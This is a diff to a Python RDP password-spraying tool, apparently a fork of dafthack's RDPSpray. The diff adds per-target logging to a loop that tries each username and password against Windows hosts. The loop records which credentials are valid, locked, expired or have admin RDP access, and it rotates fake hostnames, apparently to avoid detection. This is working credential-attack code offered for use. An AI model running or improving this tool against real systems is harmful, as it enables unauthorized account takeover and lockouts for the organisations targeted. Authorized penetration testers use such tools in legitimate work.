@@ -1,7 +1,7 @@
 # Based on the research and POC made by Beau Bullock (@dafthack),
 # https://github.com/dafthack/RDPSpray This version was written by @x_Freed0m tested with Kali
 # linux against 2012 DC escape chars in password with \ - e.g P\@ssword\!\#
-
+# version 0.2
 
 import argparse
 import csv
@@ -125,11 +125,11 @@ def fake_hostnames(hostnames_list):
     return fake_hostnames_stripped, generated_hostname_counter, hostname_looper
 
 
-def output(status, username, password, output_file_name):
+def output(status, username, password, target, output_file_name):
     try:
         with open(output_file_name + ".csv", mode='a') as log_file:
             creds_writer = csv.writer(log_file, delimiter=',', quotechar='"')
-            creds_writer.writerow([status, username, password])
+            creds_writer.writerow([status, username, password, target])
     except Exception as output_err:
         exception(output_err)
 
@@ -169,7 +169,7 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
     try:
         LOGGER.info(
             "[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-        output('Status', 'Username', 'Password', output_file_name)
+        output('Status', 'Username', 'Password', 'Target', output_file_name)
         for target in targets:
             for password in passes:
                 for username in users:
@@ -197,11 +197,11 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
                         exit(1)
                     elif any(word in output_error for word in failed_login):
                         status = 'Invalid'
-                        output(status, username, password, output_file_name)
+                        output(status, username, password, target, output_file_name)
                         LOGGER.debug("[-]Creds failed for: " + username)
                     elif account_locked in output_error:
                         status = 'Locked'
-                        output(status, username, password, output_file_name)
+                        output(status, username, password, target, output_file_name)
                         LOGGER.warning("[!] Account locked: " + username)
                         answer = locked_input('%s is Locked, do you wish to resume? (will '
                                               'auto-continue without answer)' % username, 'Y/n',
@@ -214,46 +214,47 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
                             exit(1)
                     elif account_disabled in output_error:
                         status = 'Disabled'
-                        output(status, username, password, output_file_name)
+                        output(status, username, password, target, output_file_name)
                         working_creds_counter += 1
                         LOGGER.warning(
                             "[*] Creds valid, but account disabled: " + username + " :: "
                             + password)
                     elif any(word in output_error for word in pass_expired):
                         status = 'Password Expired'
-                        output(status, username, password, output_file_name)
+                        output(status, username, password, target, output_file_name)
                         working_creds_counter += 1
                         LOGGER.warning(
                             "[*] Creds valid, but pass expired: " + username + " :: " + password)
                     elif account_expired in output_error:
                         status = 'Account expired'
-                        output(status, username, password, output_file_name)
+                        output(status, username, password, target, output_file_name)
                         working_creds_counter += 1
                         LOGGER.warning(
                             "[*] Creds valid, but account expired: " + username + " :: " + password)
                     elif any(word in output_error for word in success_login_no_rdp):
                         status = 'Valid creds WITHOUT RDP access'
-                        output(status, username, password, output_file_name)
+                        output(status, username, password, target, output_file_name)
                         working_creds_counter += 1
                         LOGGER.info(
                             "[+] Seems like the creds are valid, but no RDP permissions: "
                             + username + " :: " + password)
                     elif success_login_yes_rdp in output_error:
                         status = 'Valid creds WITH RDP access (maybe even local admin!)'
-                        output(status, username, password, output_file_name)
+                        output(status, username, password, target, output_file_name)
                         working_creds_counter += 1
                         LOGGER.info(
                             "[+] Cred successful (maybe even Admin access!): " + username + " :: " +
                             password)
                     else:
                         status = 'Unknown status, check the log file'
-                        output(status, username, password, output_file_name)
+                        output(status, username, password, target, output_file_name)
                         with open(output_file_name + ".log", mode='a') as log_file2:
                             creds_writer = csv.writer(log_file2, delimiter=',', quotechar='"')
                             creds_writer.writerow(
                                 ['Unknown status, check the csv file', username,
                                  output_error + output_info])
-                        LOGGER.error("[-]Unknown error for %s: %s %s", username, output_error,
+                        LOGGER.error("[-]Unknown error for %s: on:%s | %s %s", username, target,
+                                     output_error,
                                      str(output_info))
 
                     # going over different fake hostnames
@@ -383,7 +384,6 @@ def main():
 if __name__ == '__main__':
     main()
 
-# TODO: add option to cycle through list of targets
 # TODO: replace shell commands with better alternative
 # TODO: get more status codes
 # TODO: maybe add threads for speed?
